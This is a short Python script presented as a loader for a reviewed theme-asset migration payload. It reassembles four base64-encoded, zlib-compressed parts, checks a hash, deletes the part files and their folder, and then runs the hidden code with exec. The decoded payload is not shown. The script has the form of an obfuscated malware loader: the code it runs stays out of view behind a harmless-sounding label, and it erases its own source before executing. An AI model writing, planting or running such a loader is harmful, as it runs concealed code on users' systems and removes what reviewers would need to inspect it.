#!/usr/bin/env python3
"""Load the reviewed Issue #117 compatibility migration payload."""

from pathlib import Path
import base64
import hashlib
import zlib

EXPECTED_SHA256 = "413f44e1a1a52f26c915adcf6b8f0f10a6647aee8a84f59ae1e7d664e7842372"
payload_dir = Path(__file__).with_name("issue-117-theme-asset-migration-payload")
parts = sorted(payload_dir.glob("part*.txt"))
if len(parts) != 4:
    raise RuntimeError(f"Expected four migration payload parts, found {len(parts)}")
encoded = "".join(part.read_text(encoding="ascii").strip() for part in parts)
payload = zlib.decompress(base64.b64decode(encoded))
actual_sha256 = hashlib.sha256(payload).hexdigest()
if actual_sha256 != EXPECTED_SHA256:
    raise RuntimeError(
        f"Issue #117 payload integrity mismatch: {actual_sha256} != {EXPECTED_SHA256}"
    )
for part in parts:
    part.unlink()
payload_dir.rmdir()
exec(compile(payload, __file__, "exec"))
